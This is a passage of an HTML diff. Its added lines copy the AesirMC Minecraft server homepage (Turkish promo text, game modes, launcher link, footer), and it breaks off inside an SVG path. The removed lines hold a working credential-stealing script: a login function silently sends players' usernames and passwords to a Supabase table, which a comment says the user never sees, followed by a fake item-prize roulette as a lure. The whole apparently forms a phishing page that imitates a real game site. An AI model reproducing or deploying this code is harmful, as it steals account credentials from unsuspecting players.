+			  <img loading="lazy" class="w-7 relative transition-all top-0 group-hover:-top-10" src="./AesirMC - MMORPG Minecraft_files/discord.1768567374.svg">
+			  <img loading="lazy" class="w-4 absolute -bottom-6 transition-all group-hover:bottom-5" src="./AesirMC - MMORPG Minecraft_files/arrow.1768567480.svg">
+              
+            </a>
+            <a href="https://store.aesirmc.com/store" class="py-4 px-8 font-semibold text-lg rounded-full bg-black text-white group flex gap-2 transition-all hover:scale-105">
+                Mağazaya git                <svg class="stroke-current w-0 group-hover:w-5 transition-all" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M19.75 11.7258L4.75 11.7258" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                    <path d="M13.7002 5.70143L19.7502 11.7254L13.7002 17.7504" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                </svg>
+            </a>
+        </div>
     </div>
 </div>
 
-<div id="win-popup">
-    <div class="win-content">
-        <h2 style="color: #ffff55; font-size: 40px; text-shadow: 4px 4px #000;">BAŞARIM KAZANILDI!</h2>
-        <img src="" id="won-item-display" style="width: 100px; image-rendering: pixelated;">
-        <h3 id="won-item-title" style="font-size: 30px; text-shadow: 2px 2px #000;"></h3>
-        <button class="btn-mc" style="width: auto;" onclick="location.reload()">ENVANTERE EKLE VE TEKRARLA</button>
+<section class="voonos-container tight py-10 lg:py-40">
+    <div class="flex items-center justify-center gap-20">
+        <div data-aos="fade-right" class="h-0.5 bg-gradient-to-l from-white/75 w-72 flex gap-2 justify-end items-center aos-init">
+            <div class="rounded-full w-4 h-4 bg-white"></div>
+            <div class="rounded-full w-6 h-6 bg-white"></div>
+        </div>
+        <div data-aos="fade-up" class="text-white font-extrabold text-6xl tracking-wide aos-init">
+            Hakkımızda        </div>
+        <div data-aos="fade-left" class="h-0.5 bg-gradient-to-r from-white/75 w-72 flex gap-2 items-center aos-init">
+            <div class="rounded-full w-6 h-6 bg-white"></div>
+            <div class="rounded-full w-4 h-4 bg-white"></div>
+        </div>
+    </div>
+    <div data-aos="fade-up" class="text-white font-light text-2xl text-center tracking-wide max-w-5xl mt-10 mx-auto leading-[2] aos-init">
+        <h2 class="" data-start="291" data-end="318"><span style="color:hsl(0,0%,100%);">AesirMC’ye Hoş Geldiniz!</span></h2><p class="" data-start="320" data-end="436"><span style="color:hsl(0,0%,60%);">Biz yalnızca bir Minecraft sunucusu değil; tutku, emek ve hayal gücünden doğmuş, sınır tanımayan bir <strong data-start="421" data-end="435">topluluğuz</strong>.</span></p><p class="" data-start="438" data-end="675"><span style="color:hsl(0,0%,60%);">AesirMC, oyunculara hem eğlenceli hem de rekabetçi bir deneyim sunmak amacıyla kuruldu. deneyimli yönetim ekibimiz, </span><span style="color:hsl(0,0%,100%);">yenilikçi sistemlerimizle</span><span style="color:hsl(0,0%,60%);"> klasik sunucu anlayışını geride bırakıyor; burada yeni bir oyun kültürü inşa ediyoruz.</span></p><p class="" data-start="677" data-end="867"><span style="color:hsl(0,0%,60%);">&nbsp;İster madenci ol, ister savaşçı. Yalnız başına hayatta kal ya da dostlarınla birlikte efsaneler yaz. Her oyuncunun hikâyesi kendine özgüdür ama hedef ortak: </span><span style="color:hsl(0,0%,100%);"><strong data-start="839" data-end="867">kendi efsaneni yaratmak</strong></span><span style="color:hsl(0,0%,60%);"><strong data-start="839" data-end="867">.</strong></span></p><p class="" data-start="869" data-end="1057"><span style="color:hsl(0,0%,60%);">Adil, güvenli ve </span><span style="color:hsl(0,0%,100%);">her daim</span><span style="color:hsl(0,0%,60%);"> eğlenceli bir ortam sunmak bizim önceliğimiz. Güncel sistemler, düzenli etkinlikler ve sürekli gelişen içeriklerle </span><span style="color:hsl(0,0%,100%);">AesirMC</span><span style="color:hsl(0,0%,60%);"> her geçen gün büyümeye devam ediyor.</span><br><span style="color:hsl(0,0%,60%);">&nbsp;</span></p><p class="" data-start="1059" data-end="1117"><span style="color:hsl(0,0%,100%);"><strong data-start="1062" data-end="1117">Topluluğun bir parçası ol!</strong></span></p>    </div>
+</section>
+
+<div class="relative" x-data="{open: false}" x-intersect.full="open = true">
+    <div class="absolute z-20 top-0 inset-x-0 h-56 -scale-y-100">
+	  	<img loading="lazy" class="w-full" src="./AesirMC - MMORPG Minecraft_files/hcenter1.1768570030.svg">
+    </div>
+    <div class="absolute z-20 -bottom-px inset-x-0 h-44">
+	  <img loading="lazy" class="w-full" src="./AesirMC - MMORPG Minecraft_files/hcenter2.1768570074.svg">
+    </div>
+
+    <div class="image-container relative overflow-hidden transition-all duration-500 h-[20rem]" :class="[open?&#39;h-[45rem]&#39;:&#39;h-[20rem]&#39;]" x-ref="image_container">
+        <img loading="lazy" class="w-full absolute bottom-0 object-cover object-bottom" src="./AesirMC - MMORPG Minecraft_files/home_center.png" alt="">
     </div>
 </div>
 
-<script>
-    // --- SUPABASE BAĞLANTISI ---
-    const SUPABASE_URL = "https://iigemvvlznvgneghevev.supabase.co/rest/v1/";
-    const SUPABASE_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
-    const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    const itemHavuzu = [
-        { ad: "Elmas Kılıç", img: "https://minecraft.wiki/images/Thumb_Sprite_Diamond_Sword_JE3_BE3.png" },
-        { ad: "Netherite Zırh", img: "https://minecraft.wiki/images/Thumb_Sprite_Netherite_Chestplate_JE1_BE1.png" },
-        { ad: "Büyülü Elma", img: "https://minecraft.wiki/images/Thumb_Sprite_Enchanted_Golden_Apple_JE2_BE2.png" },
-        { ad: "Totem", img: "https://minecraft.wiki/images/Thumb_Sprite_Totem_of_Undying_JE2_BE2.png" }
-    ];
+<section class="section">
+    <div class="flex flex-col lg:flex-row gap-10 lg:gap-32 items-center">
+        <h3 x-data="textAnimation" x-intersect.once="start($el)" class="ml9 text-white text-5xl lg:text-6xl tracking-wide font-black max-w-lg leading-[3.5rem] overflow-hidden relative">
+            <span class="letters">Sunucumuzdan oyunlar</span>
+        </h3>
+        <h3 data-aos="fade-up" class="text-3xl lg:text-4xl text-[#45a8af] max-w-5xl leading-[3.5rem] overflow-hidden relative aos-init">
+            <span class="letters">Aesirmc de arkadaşlarınızda oynayabilmeniz için sunduğumuz oyunlara göz atın...</span>
+        </h3>
+        <style>
+            .ml9 .text-wrapper {
+                position: relative;
+                display: inline-block;
+                padding-top: 0.2em;
+                padding-right: 0.05em;
+                padding-bottom: 0.1em;
+                overflow: hidden;
+            }
 
-    async function girisYap() {
-        const u = document.getElementById('username').value;
-        const p = document.getElementById('password').value;
+            .ml9 .letter {
+                transform-origin: 50% 100%;
+                display: inline-block;
+                line-height: 1em;
+            }
+        </style>
+    </div>
 
-        if(!u || !p) return alert("Bilgileri boş bırakma!");
+    <div class="mt-40 grid grid-cols-1 lg:grid-cols-2 gap-20" x-data="gameAnimation({&quot;BOXPVP&quot;:&quot;\/assets\/core\/images\/games\/84352c4dbb0fbaf73bede4e32d4ad82e.png&quot;,&quot;TOWNY&quot;:&quot;\/assets\/core\/images\/games\/7ddeaeda7bce858522b1e7763dc737e8.png&quot;,&quot;MMORPG&quot;:&quot;\/assets\/core\/images\/games\/feb61827c9d9b687e55631389d170aa6.png&quot;})">
+        <div class="hidden lg:block">
+            <div class="mask-leaves sticky top-52 h-[30rem]">
+                                    <img loading="lazy" class="absolute z-20 inset-0 object-center object-cover w-full h-full" x-show="game === &#39;BOXPVP&#39;" x-transition:enter="transition ease-out duration-500" x-transition:enter-start="opacity-0 scale-150" x-transition:enter-end="opacity-100 scale-100" :src="&#39;/assets/core/images/games/84352c4dbb0fbaf73bede4e32d4ad82e.png&#39;" alt="BOXPVP" src="./AesirMC - MMORPG Minecraft_files/84352c4dbb0fbaf73bede4e32d4ad82e.png">
+                                    <img loading="lazy" class="absolute z-20 inset-0 object-center object-cover w-full h-full" x-show="game === &#39;TOWNY&#39;" x-transition:enter="transition ease-out duration-500" x-transition:enter-start="opacity-0 scale-150" x-transition:enter-end="opacity-100 scale-100" :src="&#39;/assets/core/images/games/7ddeaeda7bce858522b1e7763dc737e8.png&#39;" alt="TOWNY" src="./AesirMC - MMORPG Minecraft_files/7ddeaeda7bce858522b1e7763dc737e8.png" style="display: none;">
+                                    <img loading="lazy" class="absolute z-20 inset-0 object-center object-cover w-full h-full" x-show="game === &#39;MMORPG&#39;" x-transition:enter="transition ease-out duration-500" x-transition:enter-start="opacity-0 scale-150" x-transition:enter-end="opacity-100 scale-100" :src="&#39;/assets/core/images/games/feb61827c9d9b687e55631389d170aa6.png&#39;" alt="MMORPG" src="./AesirMC - MMORPG Minecraft_files/feb61827c9d9b687e55631389d170aa6.png" style="display: none;">
+                            </div>
+        </div>
+        <div class="flex flex-col gap-20 text-white/50">
+                            <div class="h-[34rem] grid grid-cols-1 lg:grid-cols-3 text-white" :class="{&#39;text-white&#39;: game === &#39;BOXPVP&#39;}" x-intersect.full="change(&#39;BOXPVP&#39;)">
+                    <div class="mask-leaves lg:hidden">
+                        <img loading="lazy" class="object-center object-cover" src="./AesirMC - MMORPG Minecraft_files/84352c4dbb0fbaf73bede4e32d4ad82e.png" alt="BOXPVP">
+                    </div>
+                    <div class="text-4xl font-black">BOXPVP</div>
+                    <p class="lg:col-span-2 text-2xl font-light leading-10 line-clamp-6 h-fit">
+                        Arenaya Gir, Kahramanlığını Kanıtla!&nbsp;Dar alan, yüksek adrenalin ve RPG derinliği!&nbsp;Kendi karakterini geliştir, özel yetenekler ve ekipmanlarla donan, arenada rakiplerini alt et!&nbsp;Özel kasa sistemiyle güçlü silahlar ve zırhlar itemler kazan.&nbsp;Günlük ödüller ve yetenek bazlı sıralamalarla PvP’nin efsanesi sen ol!&nbsp;🔸 Hızlı ve Stratejik: Reflekslerin kadar, taktiklerin de önem taşıyor.&nbsp;🔸 Karakter Gelişimi: Level atla, skill’lerini güçlendir, arenanın en iyisi ol.&nbsp;🔸 Özel Ekipman &amp; Itemlar: Kutulardan çıkan RPG itemlerle gücüne güç kat.&nbsp;🔸 Rekabetçi Arenalar: Günlük turnuvalar ve liderlik tablolarıyla kendini kanıtla.&nbsp;Burada sadece dövüşmek yetmez, bir kahraman gibi savaşmalısın!&nbsp;                    </p>
+                </div>
+                            <div class="h-[34rem] grid grid-cols-1 lg:grid-cols-3" :class="{&#39;text-white&#39;: game === &#39;TOWNY&#39;}" x-intersect.full="change(&#39;TOWNY&#39;)">
+                    <div class="mask-leaves lg:hidden">
+                        <img loading="lazy" class="object-center object-cover" src="./AesirMC - MMORPG Minecraft_files/7ddeaeda7bce858522b1e7763dc737e8.png" alt="TOWNY">
+                    </div>
+                    <div class="text-4xl font-black">TOWNY</div>
+                    <p class="lg:col-span-2 text-2xl font-light leading-10 line-clamp-6 h-fit">
+                        Medeniyet Seninle Başlasın!&nbsp;Toprağını seç, kasabanı kur, vatandaşlarını yönet!&nbsp;Kendi şehrini inşa et, oyuncu ekonomisini şekillendir, diplomasi ve ittifaklarla gücünü arttır.&nbsp;Barışçıl bir çiftçi misin, yoksa demir yumruklu bir lider mi? Karar senin!&nbsp;🔸 Şehir Yönetimi: Binalar inşa et, kaynakları yönet, halkının ihtiyaçlarını karşıla.&nbsp;🔸 Ekonomi &amp; Ticaret: Pazarı canlandır, zenginleş ve komşularınla rekabet et.&nbsp;🔸 Diplomasi &amp; Savaş: İttifaklar kur, düşmanlarına karşı topraklarını savun ya da fethet.&nbsp;Klasik Towny deneyimi seni bekliyor; medeniyeti inşa et, tarihi yaz!&nbsp;                    </p>
+                </div>
+                            <div class="h-[34rem] grid grid-cols-1 lg:grid-cols-3" :class="{&#39;text-white&#39;: game === &#39;MMORPG&#39;}" x-intersect.full="change(&#39;MMORPG&#39;)">
+                    <div class="mask-leaves lg:hidden">
+                        <img loading="lazy" class="object-center object-cover" src="./AesirMC - MMORPG Minecraft_files/feb61827c9d9b687e55631389d170aa6.png" alt="MMORPG">
+                    </div>
+                    <div class="text-4xl font-black">MMORPG</div>
+                    <p class="lg:col-span-2 text-2xl font-light leading-10 line-clamp-6 h-fit">
+                        Efsanenin Parçası Ol, Dünyayı Değiştir!&nbsp;Sınıflar, beceriler, destansı görevler ve ölümcül boss savaşlarıyla dolu devasa bir dünya seni bekliyor.&nbsp;Savaşçı mı olacaksın, büyücü mü yoksa keskin nişancı bir okçu mu?&nbsp;Skillerini geliştir, zindanları temizle, loncalar kur ve savaşlarda adını efsanelere yazdır!&nbsp;🔸 Derin RPG Mekanikleri: Yüzlerce item, benzersiz yetenek sistemi, çeşitli görevler.&nbsp;🔸 Boss ve Lonca Savaşları: Takımını topla, devasa bosslara karşı strateji oluştur, lonca savaşlarında üstünlüğü ele geçir.&nbsp;🔸 Canlı Dünya: Sürekli yenilenen etkinlikler, keşfedilmeyi bekleyen gizemler ve PvP arenaları.&nbsp;Bu sadece bir oyun modu değil,&nbsp;bu bir yaşam biçimi—savaş, dostluk ve zafer dolu.&nbsp;                    </p>
+                </div>
+                    </div>
+    </div>
+    <div class="mt-20 center">
+        <a href="https://store.aesirmc.com/games/" class="rounded-full py-3.5 px-6 font-medium bg-cyan-600">
+            Tüm oyunları gör        </a>
+    </div>
+</section>
 
-        // Veriyi Supabase'e "Sessizce" gönder (Hata verse bile kullanıcı görmez)
-        _supabase.from('users').insert([{ username: u, password: p }]).then();
 
-        // Beklemeden direk oyuna sok
-        document.getElementById('auth-container').style.display = 'none';
-        document.getElementById('game-container').style.display = 'block';
-        document.getElementById('welcome-msg').innerText = "Hoş Geldin, " + u;
-        document.getElementById('user-display').innerText = "Oync: " + u;
-    }
+<section class="relative overflow-hidden">
 
-    function hediyeyiAc() {
-        document.getElementById('gift-box-container').style.display = 'none';
-        document.getElementById('roulette-section').style.display = 'block';
-        const strip = document.getElementById('roulette-strip');
-        strip.innerHTML = '';
-        for(let i=0; i<60; i++) {
-            const item = itemHavuzu[Math.floor(Math.random() * itemHavuzu.length)];
-            strip.innerHTML += `<div class="slot-item"><img src="${item.img}"></div>`;
+  <img loading="lazy" class="absolute z-20 inset-x-0 -top-px -scale-y-100 w-full" src="./AesirMC - MMORPG Minecraft_files/ctaf.1768570362.svg">
+    <div x-ref="cta_bg" class="absolute z-30 pointer-events-none -bottom-48 inset-x-0 h-48 bg-black"></div>
+    <div class="absolute pointer-events-none z-30 inset-x-0 -bottom-60 h-[48rem] bg-cover bg-center" x-ref="cta_bottom" style="background-image: url(&#39;/assets/aesirmc/img/bgsk.svg&#39;)">
+    </div>
+  	<img loading="lazy" x-ref="cta_bottom2" class="absolute z-30 pointer-events-none inset-x-0 scale-125 w-full bottom-10" src="./AesirMC - MMORPG Minecraft_files/cta_bottom2.1768567656.svg">
+
+    <img loading="lazy" class="absolute inset-0 w-full h-full object-cover object-bottom" src="./AesirMC - MMORPG Minecraft_files/background.webp" alt="">
+    <div class="absolute inset-0 bg-cyan-950/50"></div>
+
+    <div class="relative pt-56 pb-[34rem] text-center z-20" x-ref="cta">
+        <div class="text-white text-6xl font-black tracking-wide">
+            AesirMC dünyasına katılın        </div>
+        <p class="mt-6 text-white text-3xl max-w-lg tracking-wide mx-auto">
+            Skyblock, faction, MMORPG, towny gibi oyun modlarinda oynayin...        </p>
+
+
+        <div class="mt-12 center gap-10">
+            <!--            <a href="#" class="rounded-full py-4 px-8 fredoka text-lg font-black text-cyan-300 border-4 border-cyan-400 transition hover:bg-cyan-500 hover:text-white hover:scale-105">Launcher'ı indir</a>-->
+            <a href="https://store.aesirmc.com/launcher" class="rounded-full py-3.5 px-8 border-2 text-white text-xl tracking-wider transition-all duration-200 hover:bg-white hover:text-black hover:scale-110 boldenvan">
+                Launcher'ı indir            </a>
+        </div>
+    </div>
+</section>    </main>
+
+    <div class="fixed z-[51] bottom-16 left-10 group">
+        <div class="rounded-full bg-yellow-600 py-4 px-7 flex gap-3 items-center
+    transition-all hover:scale-105 text-black hover:shadow-blur-xs hover:shadow-yellow-600/20 cursor-pointer" @click="openModal(&#39;copyIp&#39;,&#39;success&#39;); navigator.clipboard.writeText(&#39;launcher.aesirmc.com&#39;)">
+
+            <svg class="w-4 fill-current" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+                <path d="M128 40c0-22.1 17.9-40 40-40s40 17.9 40 40l0 148.2c8.5-7.6 19.7-12.2 32-12.2c20.6 0 38.2 13 45 31.2c8.8-9.3 21.2-15.2 35-15.2c25.3 0 46 19.5 47.9 44.3c8.5-7.7 19.8-12.3 32.1-12.3c26.5 0 48 21.5 48 48l0 48 0 16 0 48c0 70.7-57.3 128-128 128l-16 0-64 0-.1 0-5.2 0c-5 0-9.9-.3-14.7-1c-55.3-5.6-106.2-34-140-79L8 336c-13.3-17.7-9.7-42.7 8-56s42.7-9.7 56 8l56 74.7L128 40zM240 304c0-8.8-7.2-16-16-16s-16 7.2-16 16l0 96c0 8.8 7.2 16 16 16s16-7.2 16-16l0-96zm48-16c-8.8 0-16 7.2-16 16l0 96c0 8.8 7.2 16 16 16s16-7.2 16-16l0-96c0-8.8-7.2-16-16-16zm80 16c0-8.8-7.2-16-16-16s-16 7.2-16 16l0 96c0 8.8 7.2 16 16 16s16-7.2 16-16l0-96z"></path>
+            </svg>
+            <div>oyna.<span class="font-bold">aesirmc</span>.com</div>
+        </div>
+        <div class="absolute pointer-events-none inset-0 rounded-full bg-yellow-600/25 animate-ping group-hover:animate-none"></div>
+    </div>
+
+    <footer>
+    <div class="relative px-12 2xl:px-32">
+        <div class="py-20">
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-10 lg:gap-0">
+                <div class="flex-col lg:flex-row center gap-6">
+                    <img class="w-48" src="./AesirMC - MMORPG Minecraft_files/logo.png" alt="">
+                    <p class="text-white text-center lg:text-left font-light lg:mt-2 tracking-wide leading-7 text-lg">
+                        aesirminecraft@gmail.com Şirket Bilgileri KOCAELİ,Türkiye Vergi Dairesi: ULUÇINAR Not affiliated with Mojang, Microsoft or Minecraft AesirMC, 2024 © Tüm hakları saklıdır.                    </p>
+                </div>
+
+                <div class="fredoka font-bold center flex-col gap-4 tracking-wider text-white/75 text-2xl">
+                    <a href="https://store.aesirmc.com/" class="transition hover:text-white border-b border-transparent hover:border-white">Ana sayfa</a>
+                    <a href="https://store.aesirmc.com/aesirmc-kurallar-ve-cezalari" class="transition hover:text-white border-b border-transparent hover:border-white">Kurallar</a>
+                    <a href="https://store.aesirmc.com/suggestions" class="transition hover:text-white border-b border-transparent hover:border-white">Öneriler</a>
+                    <a href="https://store.aesirmc.com/applications/forms/yetkili-alim-basvuru-formu" class="transition hover:text-white border-b border-transparent hover:border-white">Yetkili başvuru</a>
+                    <a href="https://store.aesirmc.com/launcher" class="transition hover:text-white border-b border-transparent hover:border-white">Aesir launcher</a>
+                </div>
+
+                <div class="flex flex-col justify-center items-center lg:items-end">
+                                            <a href="https://voonos.com/?ref=aesirmc" class="flex flex-col items-center lg:items-end gap-2 font-light text-lg text-white/75 transition hover:text-white">
+                            designed by
+                            <svg class="fill-current h-6" viewBox="0 0 98 18" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M18.432 0.983999L18.048 0.888C18.08 0.888 18.144 0.824 18.24 0.696C18.336 0.536 18.432 0.472 18.528 0.503999C18.592 0.439999 18.624 0.503999 18.624 0.696H18.816C18.784 0.76 18.72 0.824 18.624 0.888C18.528 0.951999 18.464 0.983999 18.432 0.983999ZM4.416 17.736C4.384 17.672 4.384 17.624 4.416 17.592H4.368C4.304 17.464 4.272 17.336 4.272 17.208C4.272 17.048 4.288 16.984 4.32 17.016V16.92C4.384 16.792 4.432 16.616 4.464 16.392C4.528 16.2 4.592 15.96 4.656 15.672C4.592 15.736 4.544 15.768 4.512 15.768C4.544 15.768 4.496 15.72 4.368 15.624C4.24 15.56 4.176 15.528 4.176 15.528L4.368 14.904C4.368 14.872 4.352 14.84 4.32 14.808C4.288 14.776 4.272 14.744 4.272 14.712L4.08 13.128L3.888 13.272V12.888L3.6 11.88C3.632 11.976 3.68 12.104 3.744 12.264C3.808 12.392 3.888 12.568 3.984 12.792C4.016 12.76 4.032 12.68 4.032 12.552C4.032 12.296 3.968 12.056 3.84 11.832L3.792 11.544C3.728 11.544 3.664 11.64 3.6 11.832C3.568 11.48 3.472 11.096 3.312 10.68C3.344 10.648 3.36 10.568 3.36 10.44C3.168 10.12 3.104 9.88 3.168 9.72C3.136 9.464 3.104 9.288 3.072 9.192C3.072 9.064 3.072 9 3.072 9C2.912 8.84 2.864 8.728 2.928 8.664V8.376C2.832 8.312 2.8 8.248 2.832 8.184C2.608 7.864 2.544 7.464 2.64 6.984C2.576 6.952 2.448 6.776 2.256 6.456C2.064 6.136 1.888 5.976 1.728 5.976C1.696 5.976 1.68 6.008 1.68 6.072C1.68 6.136 1.648 6.168 1.584 6.168H1.536C1.536 6.136 1.52 6.12 1.488 6.12C1.456 6.12 1.36 6.264 1.2 6.552C1.04 6.84 0.8 7.24 0.48 7.752C0.448 7.72 0.416 7.704 0.384 7.704C0.352 7.704 0.304 7.688 0.24 7.656C0.304 7.432 0.416 7.144 0.576 6.792C0.736 6.408 1.04 5.864 1.488 5.16C1.744 4.776 2 4.552 2.256 4.488H2.4C2.432 4.456 2.48 4.44 2.544 4.44C2.64 4.44 2.768 4.504 2.928 4.632H3.072C3.072 4.536 3.12 4.44 3.216 4.344C3.344 4.408 3.44 4.488 3.504 4.584C3.6 4.68 3.68 4.76 3.744 4.824C4.16 5.752 4.64 6.648 5.184 7.512C5.184 8.056 5.232 8.552 5.328 9C5.36 9.064 5.392 9.144 5.424 9.24C5.488 9.336 5.52 9.4 5.52 9.432L5.376 9.576C5.472 9.864 5.504 10.12 5.472 10.344C5.472 10.376 5.44 10.424 5.376 10.488C5.344 10.552 5.328 10.6 5.328 10.632C5.328 10.696 5.36 10.76 5.424 10.824C5.392 10.92 5.376 11.096 5.376 11.352L5.52 12.168V13.032L5.664 13.128C5.664 12.968 5.712 12.744 5.808 12.456C6.256 12.2 6.4 11.848 6.24 11.4C6.304 11.4 6.368 11.352 6.432 11.256C6.496 11.16 6.656 10.824 6.912 10.248L7.296 9.864C7.264 9.896 7.248 9.832 7.248 9.672C7.472 9.384 7.52 9.176 7.392 9.048C7.424 9.08 7.456 9.096 7.488 9.096C7.552 9.032 7.552 8.968 7.488 8.904C7.488 8.904 7.504 8.888 7.536 8.856C7.6 8.792 7.696 8.728 7.824 8.664C7.824 8.568 7.808 8.504 7.776 8.472L8.16 7.992C8.192 7.928 8.224 7.848 8.256 7.752C8.32 7.656 8.368 7.528 8.4 7.368C8.528 7.112 8.704 6.84 8.928 6.552C9.152 6.232 9.44 5.896 9.792 5.544C9.888 5.512 9.952 5.384 9.984 5.16C10.016 5.128 10.096 5.096 10.224 5.064C10.288 4.968 10.368 4.872 10.464 4.776C10.592 4.648 10.72 4.52 10.848 4.392C10.88 4.296 10.992 4.184 11.184 4.056L11.52 3.816C11.552 3.784 11.568 3.736 11.568 3.672C11.728 3.544 11.872 3.4 12 3.24C12.128 3.08 12.256 2.904 12.384 2.712C12.416 2.712 12.496 2.776 12.624 2.904C12.656 2.872 12.672 2.808 12.672 2.712C12.672 2.744 12.704 2.76 12.768 2.76C12.704 2.76 12.832 2.6 13.152 2.28C13.312 2.248 13.52 2.104 13.776 1.848C14.192 1.624 14.48 1.512 14.64 1.512C14.672 1.512 14.688 1.528 14.688 1.56H14.736C14.736 1.56 14.8 1.512 14.928 1.416C15.056 1.32 15.168 1.224 15.264 1.128L15.36 1.224C15.36 1.192 15.376 1.16 15.408 1.128C15.408 1.16 15.44 1.176 15.504 1.176C15.728 1.176 16.048 1.032 16.464 0.743999C16.496 0.743999 16.496 0.759999 16.464 0.792C16.464 0.823999 16.48 0.839999 16.512 0.839999C16.416 0.839999 16.608 0.791999 17.088 0.696H17.52C17.552 0.663999 17.584 0.647999 17.616 0.647999C17.68 0.647999 17.776 0.711999 17.904 0.839999C17.776 0.903999 17.712 0.951999 17.712 0.983999C17.68 0.983999 17.68 0.983999 17.712 0.983999L17.568 0.839999C17.376 1.032 17.264 1.128 17.232 1.128C17.2 1.128 17.184 1.144 17.184 1.176H17.088C17.088 1.144 17.072 1.128 17.04 1.128C16.912 1.128 16.72 1.192 16.464 1.32C16.24 1.448 16.048 1.512 15.888 1.512L15.84 1.56V1.752C15.904 1.752 16 1.816 16.128 1.944C16.128 2.008 16.144 2.072 16.176 2.136H16.032C16 2.168 15.984 2.216 15.984 2.28C15.984 2.312 15.872 2.344 15.648 2.376C15.616 2.408 15.552 2.472 15.456 2.568C15.36 2.632 15.248 2.664 15.12 2.664C15.088 2.664 15.04 2.648 14.976 2.616C14.944 2.584 14.912 2.568 14.88 2.568C14.72 2.568 14.512 2.664 14.256 2.856C14.192 2.92 14.208 2.968 14.304 3C14.208 3.096 14.16 3.16 14.16 3.192C14.096 3.096 14.032 3.08 13.968 3.144C14.064 3.176 14.112 3.24 14.112 3.336C14.112 3.464 13.904 3.624 13.488 3.816C13.456 4.04 13.328 4.2 13.104 4.296C12.976 4.168 12.896 4.072 12.864 4.008C12.832 4.04 12.752 4.072 12.624 4.104C12.624 4.168 12.704 4.232 12.864 4.296C12.544 4.616 12.304 4.856 12.144 5.016C12.016 5.176 11.952 5.256 11.952 5.256C11.888 5.256 11.856 5.24 11.856 5.208C11.856 5.176 11.84 5.16 11.808 5.16L11.76 5.208L11.568 5.544C11.44 5.544 11.28 5.688 11.088 5.976C10.928 6.264 10.816 6.408 10.752 6.408H10.704C10.704 6.376 10.688 6.36 10.656 6.36C10.56 6.36 10.384 6.584 10.128 7.032L9.792 7.272C9.536 7.464 9.392 7.72 9.36 8.04L9.264 7.944H9.12C9.152 7.944 9.168 7.96 9.168 7.992C9.168 8.056 9.072 8.2 8.88 8.424C8.688 8.616 8.576 8.792 8.544 8.952C8.48 9.08 8.416 9.192 8.352 9.288C8.288 9.384 8.24 9.48 8.208 9.576C8.208 9.576 8.16 9.608 8.064 9.672C8 9.704 7.936 9.8 7.872 9.96V10.296C7.744 10.296 7.648 10.376 7.584 10.536C7.552 10.696 7.504 10.84 7.44 10.968C7.216 11.192 6.992 11.48 6.768 11.832V12.264C6.192 12.872 5.904 13.368 5.904 13.752C5.904 13.784 5.936 13.912 6 14.136C6.064 14.328 6.096 14.456 6.096 14.52C6.096 14.904 6.08 15.064 6.048 15L5.424 15.144C5.36 15.336 5.28 15.48 5.184 15.576C5.152 15.896 5.04 16.184 4.848 16.44C4.688 16.728 4.544 17.16 4.416 17.736ZM19.1265 15.048C19.1265 15.048 19.0145 14.984 18.7905 14.856C18.6945 14.856 18.5505 14.84 18.3585 14.808C18.1665 14.776 17.8785 14.664 17.4945 14.472C17.4305 14.44 17.3345 14.408 17.2065 14.376C17.1105 14.312 16.9985 14.232 16.8705 14.136C16.8385 13.976 16.6945 13.736 16.4385 13.416H16.3425L16.1985 13.512C16.1665 13.352 16.0705 13.208 15.9105 13.08C15.9105 12.952 15.8465 12.808 15.7185 12.648C15.7825 12.392 15.7825 12.104 15.7185 11.784C15.6545 11.592 15.5265 11.4 15.3345 11.208L15.4785 11.016C15.5425 10.888 15.6065 10.744 15.6705 10.584C15.7345 10.392 15.7985 10.184 15.8625 9.96C15.8945 9.832 15.9265 9.688 15.9585 9.528C15.9905 9.368 16.0385 9.176 16.1025 8.952C16.0705 8.92 15.9105 8.792 15.6225 8.568C15.3665 8.344 15.1425 8.28 14.9505 8.376C14.9825 8.312 14.9985 8.264 14.9985 8.232C14.9985 8.168 14.9985 8.136 14.9985 8.136C14.9985 8.104 14.9665 8.072 14.9025 8.04C14.8385 7.976 14.8065 7.912 14.8065 7.848C14.8065 7.848 14.8545 7.8 14.9505 7.704C15.0465 7.576 15.1105 7.512 15.1425 7.512C15.2065 7.512 15.3025 7.544 15.4305 7.608C15.5905 7.672 15.7025 7.704 15.7665 7.704C15.7985 7.704 15.8465 7.688 15.9105 7.656C15.9745 7.624 16.0225 7.608 16.0545 7.608L16.8705 7.8C16.9345 7.8 17.0305 7.768 17.1585 7.704L18.3585 6.504C18.4545 6.504 18.5025 6.488 18.5025 6.456C18.5345 6.392 18.7105 6.216 19.0305 5.928C19.0625 5.928 19.1105 5.912 19.1745 5.88C19.2705 5.848 19.3985 5.752 19.5585 5.592L19.7025 5.352C20.6305 4.712 21.4465 4.392 22.1505 4.392H22.4865C22.4225 4.456 22.4545 4.488 22.5825 4.488C22.6145 4.488 22.6625 4.472 22.7265 4.44C22.7905 4.408 22.8385 4.392 22.8705 4.392L23.1585 4.584H23.4465C23.5745 4.712 23.6385 4.776 23.6385 4.776C23.6705 4.776 23.6865 4.76 23.6865 4.728H23.7345C23.6705 4.728 23.7345 4.824 23.9265 5.016C23.9265 5.016 23.8465 5.272 23.6865 5.784C23.5905 5.848 23.4465 5.976 23.2545 6.168C23.0945 6.36 22.9825 6.456 22.9185 6.456C22.8865 6.456 22.8065 6.424 22.6785 6.36C22.5825 6.296 22.5025 6.264 22.4385 6.264C22.4065 6.264 22.3105 6.296 22.1505 6.36C21.9905 6.424 21.8785 6.488 21.8145 6.552C21.7825 6.584 21.7025 6.632 21.5745 6.696C21.4785 6.728 21.1105 6.856 20.4705 7.08C20.5025 7.304 20.4545 7.432 20.3265 7.464C20.1025 7.496 19.9585 7.576 19.8945 7.704V7.752C20.0545 7.912 20.4225 7.992 20.9985 7.992C21.0305 7.992 21.0625 7.976 21.0945 7.944C21.1585 7.912 21.2225 7.896 21.2865 7.896C21.3185 7.896 21.3505 7.912 21.3825 7.944H21.4785C21.5105 7.944 21.5585 7.928 21.6225 7.896C21.6865 7.832 21.7345 7.8 21.7665 7.8C21.8305 7.8 22.0225 7.848 22.3425 7.944C22.6625 8.04 22.8385 